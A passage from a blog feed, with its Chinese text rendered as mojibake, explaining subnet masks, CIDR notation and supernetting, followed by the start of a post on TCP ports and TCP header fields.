src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627310353378-28bccf7c-bb16-4c0a-bab3-ae3786f143e0.png#clientId=u9b6318d2-268a-4&amp;from=drop&amp;id=u2491d2c1&amp;margin=%5Bobject%20Object%5D&amp;name=322123232-c1cb32980a4bffdb_fix732.png&amp;originHeight=331&amp;originWidth=732&amp;originalType=binary%E2%88%B6=1&amp;size=90353&amp;status=done&amp;style=none&amp;taskId=ube416114-6168-443d-ae32-4bfe42df3a7" alt="322123232-c1cb32980a4bffdb_fix732.png"><br>å¯ä»¥çœ‹åˆ°ï¼Œè®¡ç®—çš„ç»“æœå°±æ˜¯ 193.10.10.0ï¼Œè¿™ä¸ªå°±æ˜¯è¯¥ IP çš„å­ç½‘å·<br>å†å‡è®¾æœ‰ 193.10.10.129 è¿™ä¸ª IPï¼Œå®ƒçš„å­ç½‘æ©ç ä¸º 255.255.255.128ï¼Œç„¶åå°†ä»–ä»¬çš„äºŒè¿›åˆ¶éƒ½è¡¨ç¤ºå‡ºæ¥ï¼Œå°†ä»–ä»¬çš„æ¯ä¸€ä½è¿›è¡Œâ€œ<strong>ä¸</strong>â€è¿ç®—ï¼Œä¼šå¾—åˆ°å¦‚ä¸‹ç»“æœ<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627310377557-26b7154e-376b-4b22-978c-b3d77e2735f4.png#clientId=u9b6318d2-268a-4&amp;from=drop&amp;id=uff00f945&amp;margin=%5Bobject%20Object%5D&amp;name=3139748922-496c7ffdc9a887ee_fix732.png&amp;originHeight=318&amp;originWidth=732&amp;originalType=binary%E2%88%B6=1&amp;size=96213&amp;status=done&amp;style=none&amp;taskId=u7747bb46-db68-4563-9c36-8fa828cc1aa" alt="3139748922-496c7ffdc9a887ee_fix732.png"><br>å¯ä»¥çœ‹åˆ°ï¼Œè®¡ç®—çš„ç»“æœå°±æ˜¯ 193.10.10.128ï¼Œè¿™ä¸ªå°±æ˜¯è¯¥ IP çš„å­ç½‘å·<br>æ‰€ä»¥ï¼Œ<strong>é€šè¿‡å­ç½‘æ©ç å’Œ IP è¿›è¡Œä¸è¿ç®—ï¼Œå°±å¯ä»¥å¿«é€Ÿå¾—åˆ°è¯¥ IP æ‰€å±çš„å­ç½‘å·</strong><br><strong>â€‹</strong></p><h2 id="äº”ã€æ— åˆ†ç±»ç¼–å€-CIDR"><a href="#äº”ã€æ— åˆ†ç±»ç¼–å€-CIDR" class="headerlink" title="äº”ã€æ— åˆ†ç±»ç¼–å€ CIDR"></a>äº”ã€æ— åˆ†ç±»ç¼–å€ CIDR</h2><p>ç”±äºå­ç½‘çš„åˆ’åˆ†è¿˜æ˜¯æ¯”è¾ƒçš„å¤æ‚ï¼Œå…ˆè¦çŸ¥é“ç½‘ç»œå·ï¼Œç„¶åè¿›è¡Œå­ç½‘å·çš„åˆ’åˆ†ã€‚æˆ‘ä»¬æ˜¯å¸Œæœ›æœ‰æ›´å¥½ã€æ›´ç®€ä¾¿çš„åˆ’åˆ†ï¼Œå»ä½¿ç”¨ IP åœ°å€ï¼Œå› æ­¤å°±æ˜¯æå‡ºäº†ï¼Œ<strong>æ— åˆ†ç±»ç¼–å€ CIDR</strong></p><ul><li>CIDR ä¸­æ²¡æœ‰ Aã€Bã€C ç±»ç½‘ç»œå·å’Œå­ç½‘åˆ’åˆ†çš„æ¦‚å¿µ</li><li>CIDR å°†<strong>ç½‘ç»œå‰ç¼€</strong>ç›¸åŒçš„ IP åœ°å€ç§°ä¸ºä¸€ä¸ªâ€œ<strong>CIDR åœ°å€å—</strong>â€</li></ul><p>å› æ­¤ï¼Œå¯¹äº CIDRï¼Œå®ƒçš„ IP åœ°å€åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ï¼š<strong>ç½‘ç»œå‰ç¼€</strong>å’Œ<strong>ä¸»æœºå·</strong>ã€‚ç½‘ç»œå‰ç¼€å¹¶ä¸æ˜¯å’Œå‰è¾¹çš„ç½‘ç»œå·ä¸€æ ·ï¼Œä»–ä»¬æœ€å¤§çš„ä¸åŒå°±æ˜¯ï¼Œ<strong>ç½‘ç»œå‰ç¼€çš„ä½æ•°æ˜¯ä»»æ„çš„</strong></p><h4 id="æ–œçº¿è®°æ³•"><a href="#æ–œçº¿è®°æ³•" class="headerlink" title="æ–œçº¿è®°æ³•"></a>æ–œçº¿è®°æ³•</h4><p>CIDR åœ¨è®°å½•çš„æ—¶å€™ï¼Œé€šå¸¸ä½¿ç”¨æ–œçº¿è®°æ³•æ¥è®°å½•ç›¸å…³çš„ IP åœ°å€ï¼Œå¦‚ï¼š<br>192.10.10.129/25 è¡¨ç¤ºå®ƒçš„ç½‘ç»œå‰ç¼€æœ‰ 25 ä½ï¼Œé‚£ä¹ˆä¸»æœºå·å°±æ˜¯ä¸ƒä½ï¼ˆ<strong>11000001.00001010.00001010.1</strong>0000001ï¼‰ã€‚é™¤äº† 25 ä»¥å¤–ï¼Œè¿˜æœ‰å¾ˆå¤š<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627310444465-3183aaeb-a947-43c7-8651-8b05a842eebd.png#clientId=u9b6318d2-268a-4&amp;from=drop&amp;id=ud8c6f319&amp;margin=%5Bobject%20Object%5D&amp;name=2117259349-456e8016555fd8bf_fix732.png&amp;originHeight=369&amp;originWidth=732&amp;originalType=binary%E2%88%B6=1&amp;size=124377&amp;status=done&amp;style=none&amp;taskId=ub3f79241-7da2-4418-88ca-87209f48755" alt="2117259349-456e8016555fd8bf_fix732.png"><br>è¿˜æ˜¯æœ€ä¸Šè¾¹çš„é‚£ä¸ªä¾‹å­ï¼šæŸå…¬å¸æ‹¥æœ‰ 100 åå‘˜å·¥ï¼Œæ¯äººé…å¤‡ä¸€å°è®¡ç®—æœºï¼Œè¯·é—®è¯¥å…¬å¸åº”è¯¥ç”³è¯·å“ªç§ç½‘æ®µï¼Ÿ<br>å¦‚æœä½¿ç”¨ CIDR è¿™ä¸ªè®°æ³•æ¥è¿›è¡Œåˆ†é…çš„è¯ï¼Œå°±åªéœ€è¦ç»™å®ƒåˆ†é…ä¸€ä¸ªç½‘ç»œå‰ç¼€ä¸º 25 çš„ IP ç½‘ç»œå·å°±å¯ä»¥äº†(/25)<br>å‡è®¾è¯¥å…¬å¸å¢åŠ äº† 100 åå‘˜å·¥ï¼Œå¹¶ä¸”æ‹†åˆ†æˆä¸¤ä¸ªéƒ¨é—¨ï¼Œæ­¤æ—¶å¦‚ä½•è¿›è¡Œ IP çš„è§„åˆ’ï¼Ÿ<br>è¿™ä¸ªæ—¶å€™å…¶å®å¯ä»¥ä¸ºä»–ä»¬åˆ†é…ä¸€ä¸ª 24 ä½ç½‘ç»œå‰ç¼€çš„ IP åœ°å€ï¼Œç„¶åå¯¹äºæ¯ä¸€ä¸ªéƒ¨é—¨éƒ½åˆ†é… 25 ä½ç½‘ç»œå‰ç¼€çš„ IP åœ°å€ã€‚è¿™é‡Œå°±æœ‰å°å‹ç½‘ç»œå’Œå¤§å‹ç½‘ç»œçš„æ¦‚å¿µäº†ï¼Œåœ¨ CIDR ä¸­ï¼Œå°å‹ç½‘ç»œé€šå¸¸ç§°ä¸º<strong>å­ç½‘</strong>ï¼Œå¯¹äºé‚£ä¸ªç½‘ç»œå‰ç¼€ä¸º 24 ä½çš„ï¼Œåœ¨ CIRDR ä¸­ï¼Œç§°ä¸º<strong>è¶…ç½‘</strong><br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627310467874-fad08696-0f3c-4eea-8abc-1120121927b7.png#clientId=u9b6318d2-268a-4&amp;from=drop&amp;id=u72da92d8&amp;margin=%5Bobject%20Object%5D&amp;name=2171528328-0eeaea609b60f1f5_fix732.png&amp;originHeight=288&amp;originWidth=732&amp;originalType=binary%E2%88%B6=1&amp;size=47475&amp;status=done&amp;style=none&amp;taskId=u11d51e5b-cb71-4ad2-ad0c-de0fb6a1bf2" alt="2171528328-0eeaea609b60f1f5_fix732.png"><br>å¦‚æœå°†è¯¥ä¾‹å­æ‹“å±•ä¸€ä¸‹ï¼Œæ‹“å±•ä¸ºæŸä¸€ä¸ªåŸå¸‚ã€‚å¦‚æœå¯¹ä¸€ä¸ªåŸå¸‚ï¼Œä½¿ç”¨ CIDR è¿›è¡Œç½‘ç»œè§„åˆ’ï¼Œå¯èƒ½ç»™è¿™ä¸ªåŸå¸‚åˆ†é…ç½‘ç»œå‰ç¼€ä¸º 18 çš„ç½‘ç»œåœ°å€ï¼Œç»™è¯¥åŸå¸‚ä¸­çš„å…¬å¸åˆ†é…ç½‘ç»œå‰ç¼€ä¸º 20 çš„ç½‘ç»œåœ°å€ï¼Œå¯¹äºå…¬å¸éƒ¨é—¨ï¼Œåˆ™åˆ†é…ç½‘ç»œå‰ç¼€ä¸º 24 çš„ç½‘ç»œåœ°å€<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627310482397-36f4be97-7a33-4672-826e-6d2306030629.png#clientId=u9b6318d2-268a-4&amp;from=drop&amp;id=u4d1e17ad&amp;margin=%5Bobject%20Object%5D&amp;name=2822284147-1a223d5a8e2f58a0_fix732.png&amp;originHeight=347&amp;originWidth=732&amp;originalType=binary%E2%88%B6=1&amp;size=75153&amp;status=done&amp;style=none&amp;taskId=u26b314b6-b397-48d0-8929-77004936f2a" alt="2822284147-1a223d5a8e2f58a0_fix732.png"></p>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç½‘ç»œ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TCP/IPåè®®è¯¦è§£</title>
      <link href="/post/3fc8ae63.html"/>
      <url>/post/3fc8ae63.html</url>
      
        <content type="html"><![CDATA[<h1 id="TCP-IP-åè®®è¯¦è§£"><a href="#TCP-IP-åè®®è¯¦è§£" class="headerlink" title="TCP/IP åè®®è¯¦è§£"></a>TCP/IP åè®®è¯¦è§£</h1><h2 id="ä¸€ã€TCP-ç«¯å£"><a href="#ä¸€ã€TCP-ç«¯å£" class="headerlink" title="ä¸€ã€TCP ç«¯å£"></a>ä¸€ã€TCP ç«¯å£</h2><h3 id="1-ç«¯å£ä¸è¿›ç¨‹"><a href="#1-ç«¯å£ä¸è¿›ç¨‹" class="headerlink" title="1. ç«¯å£ä¸è¿›ç¨‹"></a>1. ç«¯å£ä¸è¿›ç¨‹</h3><p>TCP çš„åŒ…æ˜¯ä¸åŒ…å« IP åœ°å€ä¿¡æ¯çš„ï¼Œé‚£æ˜¯ IP å±‚ä¸Šçš„äº‹ï¼Œä½†æ˜¯æœ‰æºç«¯å£å’Œç›®çš„ç«¯å£ã€‚ å°±æ˜¯è¯´ï¼Œç«¯å£è¿™ä¸€ä¸œè¥¿ï¼Œæ˜¯å±äº TCP çŸ¥è¯†èŒƒç•´çš„ã€‚<br>æˆ‘ä»¬çŸ¥é“ä¸¤ä¸ªè¿›ç¨‹ï¼Œåœ¨è®¡ç®—æœºå†…éƒ¨è¿›è¡Œé€šä¿¡ï¼Œå¯ä»¥æœ‰ç®¡é“ã€å†…å­˜å…±äº«ã€ä¿¡å·é‡ã€æ¶ˆæ¯é˜Ÿåˆ—ç­‰æ–¹æ³•ã€‚ è€Œä¸¤ä¸ªè¿›ç¨‹å¦‚æœéœ€è¦è¿›è¡Œé€šè®¯æœ€åŸºæœ¬çš„ä¸€ä¸ªå‰ææ˜¯èƒ½å¤Ÿå”¯ä¸€çš„æ ‡è¯†ä¸€ä¸ªè¿›ç¨‹ï¼Œåœ¨æœ¬åœ°è¿›ç¨‹é€šè®¯ä¸­æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<strong>ã€ŒPID(è¿›ç¨‹æ ‡è¯†ç¬¦)ã€</strong> æ¥å”¯ä¸€æ ‡è¯†ä¸€ä¸ªè¿›ç¨‹ã€‚ ä½† PID åªåœ¨æœ¬åœ°å”¯ä¸€ï¼Œå¦‚æœæŠŠä¸¤ä¸ªè¿›ç¨‹æ”¾åˆ°äº†ä¸åŒçš„ä¸¤å°è®¡ç®—æœºï¼Œç„¶åä»–ä»¬è¦é€šä¿¡çš„è¯ï¼ŒPID å°±ä¸å¤Ÿç”¨äº†ï¼Œè¿™æ ·å°±éœ€è¦å¦å¤–ä¸€ç§æ‰‹æ®µäº†ã€‚<br>è§£å†³è¿™ä¸ªé—®é¢˜çš„æ–¹æ³•å°±æ˜¯åœ¨è¿è¾“å±‚ä½¿ç”¨<strong>ã€Œåè®®ç«¯å£å· (protocol port number)ã€</strong>ï¼Œç®€ç§°<strong>ã€Œç«¯å£ (port)ã€</strong>ã€‚ æˆ‘ä»¬çŸ¥é“ IP å±‚çš„ ip åœ°å€å¯ä»¥å”¯ä¸€æ ‡è¯†ä¸»æœºï¼Œè€Œ TCP å±‚åè®®å’Œç«¯å£å·å¯ä»¥å”¯ä¸€æ ‡è¯†ä¸»æœºçš„ä¸€ä¸ªè¿›ç¨‹ï¼Œè¿™æ ·æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ï¼š<strong>ã€Œip åœ°å€ï¼‹åè®®ï¼‹ç«¯å£å·ã€</strong>å”¯ä¸€æ ‡ç¤ºç½‘ç»œä¸­çš„ä¸€ä¸ªè¿›ç¨‹ã€‚ åœ¨ä¸€äº›åœºåˆï¼Œä¹ŸæŠŠè¿™ç§å”¯ä¸€æ ‡è¯†çš„æ¨¡å¼ç§°ä¸º<strong>ã€Œå¥—æ¥å­— (Socket)ã€</strong>ã€‚<br>è¿™å°±æ˜¯è¯´ï¼Œè™½ç„¶é€šä¿¡çš„é‡ç‚¹æ˜¯åº”ç”¨è¿›ç¨‹ï¼Œä½†æˆ‘ä»¬åªè¦æŠŠè¦ä¼ é€çš„æŠ¥æ–‡äº¤åˆ°ç›®çš„ä¸»æœºçš„æŸä¸€ä¸ªåˆé€‚çš„ç«¯å£ï¼Œå‰©ä¸‹çš„å·¥ä½œå°±ç”± TCP æ¥å®Œæˆäº†ã€‚</p><h3 id="2-è®¤è¯†ç«¯å£"><a href="#2-è®¤è¯†ç«¯å£" class="headerlink" title="2. è®¤è¯†ç«¯å£"></a>2. è®¤è¯†ç«¯å£</h3><p>TCP ç”¨ä¸€ä¸ª 16 ä½ç«¯å£å·æ¥æ ‡è¯†ä¸€ä¸ªç«¯å£ï¼Œå¯å…è®¸æœ‰ 65536 ( 2 çš„ 16 æ¬¡æ–¹) ä¸ªä¸åŒçš„ç«¯å£å·ï¼ŒèŒƒå›´åœ¨ 0 ~ 65535 ä¹‹é—´ã€‚<br>ä¸€äº›å¸¸è§çš„ç«¯å£å·ï¼š</p><table><thead><tr><th><strong>åº”ç”¨ç¨‹åº</strong></th><th>FTP</th><th>TELNET</th><th>SMTP</th><th>DNS</th><th>TFTP</th><th>HTTP</th><th>HTTPS</th><th>SNMP</th></tr></thead><tbody><tr><td><strong>ç†ŸçŸ¥ç«¯å£å·</strong></td><td>21</td><td>23</td><td>25</td><td>53</td><td>69</td><td>80</td><td>443</td><td>161</td></tr></tbody></table><h2 id="äºŒã€TCP-æŠ¥æ–‡ç»“æ„"><a href="#äºŒã€TCP-æŠ¥æ–‡ç»“æ„" class="headerlink" title="äºŒã€TCP æŠ¥æ–‡ç»“æ„"></a>äºŒã€TCP æŠ¥æ–‡ç»“æ„</h2><p>TCP æ˜¯é¢å‘å­—èŠ‚æµçš„ï¼Œä½†ä¼ é€çš„æ•°æ®å•å…ƒå´æ˜¯æŠ¥æ–‡æ®µã€‚<br><strong>ä»€ä¹ˆæ˜¯æŠ¥æ–‡ï¼Ÿ</strong> ä¾‹å¦‚ä¸€ä¸ª 100kb çš„ HTML æ–‡æ¡£éœ€è¦ä¼ é€åˆ°å¦å¤–ä¸€å°è®¡ç®—æœºï¼Œå¹¶ä¸ä¼šæ•´ä¸ªæ–‡æ¡£ç›´æ¥ä¼ é€è¿‡å»ï¼Œå¯èƒ½ä¼šåˆ‡å‰²æˆå‡ ä¸ªéƒ¨åˆ†ï¼Œæ¯”å¦‚å››ä¸ªåˆ†åˆ«ä¸º 25kb çš„æ•°æ®æ®µã€‚ è€Œæ¯ä¸ªæ•°æ®æ®µå†åŠ ä¸Šä¸€ä¸ª TCP é¦–éƒ¨ï¼Œå°±ç»„æˆäº† TCP æŠ¥æ–‡ã€‚ ä¸€å…±å››ä¸ª TCP æŠ¥æ–‡ï¼Œå‘é€åˆ°å¦å¤–ä¸€ä¸ªç«¯ã€‚ å¦å¤–ä¸€ç«¯æ”¶åˆ°æ•°æ®åŒ…ï¼Œç„¶åå†å‰”é™¤ TCP é¦–éƒ¨ï¼Œç»„è£…èµ·æ¥ã€‚ ç­‰åˆ°å››ä¸ªæ•°æ®åŒ…éƒ½æ”¶åˆ°äº†ï¼Œå°±èƒ½è¿˜åŸå‡ºæ¥ä¸€ä¸ªå®Œæ•´çš„ HTML æ–‡æ¡£äº†ã€‚<br>åœ¨ OSI çš„ä¸ƒå±‚åè®®ä¸­ï¼Œç¬¬äºŒå±‚ï¼ˆæ•°æ®é“¾è·¯å±‚ï¼‰çš„æ•°æ®å«ã€ŒFrameã€ï¼Œç¬¬ä¸‰å±‚ï¼ˆç½‘ç»œå±‚ï¼‰ä¸Šçš„æ•°æ®å«ã€ŒPacketã€ï¼Œç¬¬å››å±‚ï¼ˆä¼ è¾“å±‚ï¼‰çš„æ•°æ®å«ã€ŒSegmentã€ã€‚<br>TCP æŠ¥æ–‡ (Segment)ï¼ŒåŒ…æ‹¬é¦–éƒ¨å’Œæ•°æ®éƒ¨åˆ†ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627301281422-ea93eb5a-5a77-4e83-85ea-ea593d5d680d.png#clientId=u5f8f13c6-200a-4&amp;from=paste&amp;height=131&amp;id=u7ab0f987&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%AE%9E%E8%AE%AD%E4%BA%8C.png&amp;originHeight=96&amp;originWidth=282&amp;originalType=binary%E2%88%B6=1&amp;size=5361&amp;status=done&amp;style=none&amp;taskId=ua474028e-5d52-4567-a718-50ccc5b6f64&amp;width=385" alt="å®è®­äºŒ.png"><br>è€Œ TCP çš„å…¨éƒ¨åŠŸèƒ½éƒ½ä½“ç°åœ¨å®ƒé¦–éƒ¨ä¸­å„å­—æ®µçš„ä½œç”¨ï¼Œåªæœ‰å¼„æ¸… TCP é¦–éƒ¨å„å­—æ®µçš„ä½œç”¨æ‰èƒ½æŒæ¡ TCP çš„å·¥ä½œåŸç†ã€‚ TCP æŠ¥æ–‡æ®µé¦–éƒ¨çš„å‰ 20 ä¸ªå­—èŠ‚æ˜¯å›ºå®šçš„ï¼Œåé¢æœ‰ 4N å­—èŠ‚æ˜¯æ ¹æ®éœ€è¦è€Œå¢åŠ çš„ã€‚ ä¸‹å›¾æ˜¯æŠŠ TCP æŠ¥æ–‡ä¸­çš„é¦–éƒ¨æ”¾å¤§æ¥çœ‹ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627301461063-ca7ff995-315f-4b67-b301-135da472f17b.png#clientId=u5f8f13c6-200a-4&amp;from=paste&amp;height=440&amp;id=ua56be9a6&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=440&amp;originWidth=720&amp;originalType=binary%E2%88%B6=1&amp;size=29701&amp;status=done&amp;style=none&amp;taskId=ub96d79f1-92cc-4cb7-8fdf-b98509296f1&amp;width=720" alt="image.png"><br>TCP çš„é¦–éƒ¨åŒ…æ‹¬ä»¥ä¸‹å†…å®¹ï¼š</p><ol><li> æºç«¯å£ source port</li><li> ç›®çš„ç«¯å£ destination port</li><li> åºå· sequence number</li><li> ç¡®è®¤å· acknowledgment number</li><li> æ•°æ®åç§» offset</li><li> ä¿ç•™ reserved</li><li> æ ‡å¿—ä½ tcp flags</li><li> çª—å£å¤§å° window size</li><li> æ£€éªŒå’Œ checksum</li><li> ç´§æ€¥æŒ‡é’ˆ urgent pointer</li><li> é€‰é¡¹ tcp options</li></ol><p>â€‹</p><h3 id="TCP-é¦–éƒ¨å„å­—æ®µçš„æ„ä¹‰å’Œä½œç”¨"><a href="#TCP-é¦–éƒ¨å„å­—æ®µçš„æ„ä¹‰å’Œä½œç”¨" class="headerlink" title="TCP é¦–éƒ¨å„å­—æ®µçš„æ„ä¹‰å’Œä½œç”¨"></a>TCP é¦–éƒ¨å„å­—æ®µçš„æ„ä¹‰å’Œä½œç”¨</h3><h3 id="01-æºç«¯å£å’Œç›®çš„ç«¯å£-Port"><a href="#01-æºç«¯å£å’Œç›®çš„ç«¯å£-Port" class="headerlink" title="01. æºç«¯å£å’Œç›®çš„ç«¯å£ Port"></a>01. æºç«¯å£å’Œç›®çš„ç«¯å£ Port</h3><p>å„å <strong>2</strong>ä¸ª å­—èŠ‚ï¼Œå…±<strong>4</strong>ä¸ªå­—èŠ‚ã€‚ ç”¨æ¥å‘ŠçŸ¥ä¸»æœºè¯¥æŠ¥æ–‡æ®µæ˜¯æ¥è‡ªå“ªé‡Œä»¥åŠä¼ é€ç»™å“ªä¸ªåº”ç”¨ç¨‹åºï¼ˆåº”ç”¨ç¨‹åºç»‘å®šäº†ç«¯å£ï¼‰çš„ã€‚ è¿›è¡Œ TCP é€šè®¯æ—¶ï¼Œå®¢æˆ·ç«¯é€šå¸¸ä½¿ç”¨ç³»ç»Ÿè‡ªåŠ¨é€‰æ‹©çš„ä¸´æ—¶ç«¯å£å·ï¼Œè€ŒæœåŠ¡å™¨åˆ™ä½¿ç”¨çŸ¥åæœåŠ¡ç«¯å£å·ã€‚</p><h3 id="02-åºå·-Sequence-Number"><a href="#02-åºå·-Sequence-Number" class="headerlink" title="02. åºå· Sequence Number"></a>02. åºå· Sequence Number</h3><p>å  <strong>4</strong> ä¸ªå­—èŠ‚ã€‚ TCP æ˜¯é¢å‘å­—èŠ‚æµçš„ï¼Œåœ¨ä¸€ä¸ª TCP è¿æ¥ä¸­ä¼ è¾“çš„å­—èŠ‚æµä¸­çš„æ¯ä¸ªå­—èŠ‚éƒ½æŒ‰ç…§é¡ºåºç¼–å·ã€‚ ä¾‹å¦‚ 100 kb çš„ HTML æ–‡æ¡£æ•°æ®ï¼Œä¸€å…± 102400 (100 * 1024) ä¸ªå­—èŠ‚ï¼Œé‚£ä¹ˆæ¯ä¸€ä¸ªå­—èŠ‚å°±éƒ½æœ‰äº†ç¼–å·ï¼Œæ•´ä¸ªæ–‡æ¡£çš„ç¼–å·çš„èŒƒå›´æ˜¯ 0 ~ 102399ã€‚<br>åºå·å­—æ®µå€¼æŒ‡çš„æ˜¯<strong>æœ¬æŠ¥æ–‡æ®µ</strong>æ‰€å‘é€çš„æ•°æ®çš„ç¬¬ä¸€ä¸ªå­—èŠ‚çš„åºå·ã€‚ é‚£ä¹ˆ 100 çš„ HTML æ–‡æ¡£åˆ†å‰²æˆå››ä¸ªç­‰åˆ†ä¹‹åï¼Œ ç¬¬ä¸€ä¸ª TCP æŠ¥æ–‡æ®µåŒ…å«çš„æ˜¯ç¬¬ä¸€ä¸ª 25kb çš„æ•°æ®ï¼Œ0 ~ 25599 å­—èŠ‚ï¼Œ è¯¥æŠ¥æ–‡çš„åºå·çš„å€¼å°±æ˜¯ï¼š0 ç¬¬äºŒä¸ª TCP æŠ¥æ–‡æ®µåŒ…å«çš„æ˜¯ç¬¬äºŒä¸ª 25kb çš„æ•°æ®ï¼Œ25600 ~ 51199 å­—èŠ‚ï¼Œè¯¥æŠ¥æ–‡çš„åºå·çš„å€¼å°±æ˜¯ï¼š25600 â€¦â€¦<br>æ ¹æ® 8 ä½ = 1 å­—èŠ‚ï¼Œé‚£ä¹ˆ 4 ä¸ªå­—èŠ‚å¯ä»¥è¡¨ç¤ºçš„æ•°å€¼èŒƒå›´ï¼š[0, 2^32]ï¼Œä¸€å…± 2^32 (4294967296) ä¸ªåºå·ã€‚ åºå·å¢åŠ åˆ°æœ€å¤§å€¼çš„æ—¶å€™ï¼Œä¸‹ä¸€ä¸ªåºå·åˆå›åˆ°äº† 0. ä¹Ÿå°±æ˜¯è¯´ TCP åè®®å¯å¯¹ 4GB çš„æ•°æ®è¿›è¡Œç¼–å·ï¼Œåœ¨ä¸€èˆ¬æƒ…å†µä¸‹å¯ä¿è¯å½“åºå·é‡å¤ä½¿ç”¨æ—¶ï¼Œæ—§åºå·çš„æ•°æ®æ—©å·²ç»é€šè¿‡ç½‘ç»œåˆ°è¾¾ç»ˆç‚¹æˆ–è€…ä¸¢å¤±äº†ã€‚</p><h3 id="03-ç¡®è®¤å·-Acknowledgemt-Number"><a href="#03-ç¡®è®¤å·-Acknowledgemt-Number" class="headerlink" title="03. ç¡®è®¤å· Acknowledgemt Number"></a>03. ç¡®è®¤å· Acknowledgemt Number</h3><p>å <strong>4</strong>ä¸ªå­—èŠ‚ã€‚ è¡¨ç¤º<strong>æœŸæœ›æ”¶åˆ°å¯¹æ–¹ä¸‹ä¸€ä¸ªæŠ¥æ–‡æ®µçš„åºå·å€¼</strong>ã€‚ TCP çš„å¯é æ€§ï¼Œæ˜¯å»ºç«‹åœ¨ã€Œæ¯ä¸€ä¸ªæ•°æ®æŠ¥æ–‡éƒ½éœ€è¦ç¡®è®¤æ”¶åˆ°ã€çš„åŸºç¡€ä¹‹ä¸Šçš„ã€‚ å°±æ˜¯è¯´ï¼Œé€šè®¯çš„ä»»ä½•ä¸€æ–¹åœ¨æ”¶åˆ°å¯¹æ–¹çš„ä¸€ä¸ªæŠ¥æ–‡ä¹‹åï¼Œéƒ½è¦å‘é€ä¸€ä¸ªç›¸å¯¹åº”çš„ã€Œç¡®è®¤æŠ¥æ–‡ã€ï¼Œæ¥è¡¨è¾¾ç¡®è®¤æ”¶åˆ°ã€‚<strong>é‚£ä¹ˆï¼Œç¡®è®¤æŠ¥æ–‡ï¼Œå°±ä¼šåŒ…å«ç¡®è®¤å·</strong>ã€‚ ä¾‹å¦‚ï¼Œé€šè®¯çš„ä¸€æ–¹æ”¶åˆ°äº†ç¬¬ä¸€ä¸ª 25kb çš„æŠ¥æ–‡ï¼Œè¯¥æŠ¥æ–‡çš„ åºå·å€¼=0ï¼Œé‚£ä¹ˆå°±éœ€è¦å›å¤ä¸€ä¸ª<strong>ç¡®è®¤æŠ¥æ–‡</strong>ï¼Œå…¶ä¸­çš„ç¡®è®¤å· = 25600.</p><h3 id="04-æ•°æ®åç§»-Offset"><a href="#04-æ•°æ®åç§»-Offset" class="headerlink" title="04. æ•°æ®åç§» Offset"></a>04. æ•°æ®åç§» Offset</h3><p>å <strong>0.5</strong>ä¸ªå­—èŠ‚ (4 ä½)ã€‚ è¿™ä¸ªå­—æ®µå®é™…ä¸Šæ˜¯æŒ‡å‡ºäº†<strong>TCP æŠ¥æ–‡æ®µçš„é¦–éƒ¨é•¿åº¦</strong>ï¼Œå®ƒæŒ‡å‡ºäº† TCP æŠ¥æ–‡æ®µçš„æ•°æ®èµ·å§‹å¤„ è·ç¦» TCP æŠ¥æ–‡çš„èµ·å§‹å¤„ æœ‰å¤šè¿œã€‚ï¼ˆæ³¨æ„ æ•°æ®èµ·å§‹å¤„ å’Œ æŠ¥æ–‡èµ·å§‹å¤„ çš„æ„æ€ï¼‰<br>ä¸€ä¸ªæ•°æ®åç§»é‡ = 4 byteï¼Œç”±äº 4 ä½äºŒè¿›åˆ¶æ•°èƒ½è¡¨ç¤ºçš„æœ€å¤§åè¿›åˆ¶æ•°å­—æ˜¯ 15ï¼Œå› æ­¤æ•°æ®åç§»çš„æœ€å¤§å€¼æ˜¯ 60 byteï¼Œè¿™ä¹Ÿä¾§é¢é™åˆ¶äº† TCP é¦–éƒ¨çš„æœ€å¤§é•¿åº¦ã€‚</p><h3 id="05-ä¿ç•™-Reserved"><a href="#05-ä¿ç•™-Reserved" class="headerlink" title="05. ä¿ç•™ Reserved"></a>05. ä¿ç•™ Reserved</h3><p>å  <strong>0.75</strong> ä¸ªå­—èŠ‚ (6 ä½)ã€‚ ä¿ç•™ä¸ºä»Šåä½¿ç”¨ï¼Œä½†ç›®å‰åº”ç½®ä¸º 0ã€‚</p><h3 id="06-æ ‡å¿—ä½-TCP-Flags"><a href="#06-æ ‡å¿—ä½-TCP-Flags" class="headerlink" title="06. æ ‡å¿—ä½ TCP Flags"></a>06. æ ‡å¿—ä½ TCP Flags</h3><p>æ ‡å¿—ä½ï¼Œä¸€å…±æœ‰ 6 ä¸ªï¼Œåˆ†åˆ«å  1 ä½ï¼Œå…± 6 ä½ ã€‚ æ¯ä¸€ä½çš„å€¼åªæœ‰ 0 å’Œ 1ï¼Œåˆ†åˆ«è¡¨è¾¾ä¸åŒæ„æ€ã€‚<br><strong>ç´§æ€¥ URG (Urgent)</strong><br>å½“ <code>URG = 1</code> çš„æ—¶å€™ï¼Œè¡¨ç¤ºç´§æ€¥æŒ‡é’ˆï¼ˆUrgent Pointerï¼‰æœ‰æ•ˆã€‚ å®ƒå‘Šè¯‰ç³»ç»Ÿæ­¤æŠ¥æ–‡æ®µä¸­æœ‰ç´§æ€¥æ•°æ®ï¼Œåº”å°½å¿«ä¼ é€ï¼Œè€Œä¸è¦æŒ‰åŸæ¥çš„æ’é˜Ÿé¡ºåºæ¥ä¼ é€ã€‚ URG è¦ä¸é¦–éƒ¨ä¸­çš„ ç´§æ€¥æŒ‡é’ˆ å­—æ®µé…åˆä½¿ç”¨ã€‚<br><strong>ç¡®è®¤ ACK (Acknowlegemt)</strong><br>å½“ <code>ACK = 1</code> çš„æ—¶å€™ï¼Œç¡®è®¤å·ï¼ˆAcknowledgemt Numberï¼‰æœ‰æ•ˆã€‚ ä¸€èˆ¬ç§°æºå¸¦ ACK æ ‡å¿—çš„ TCP 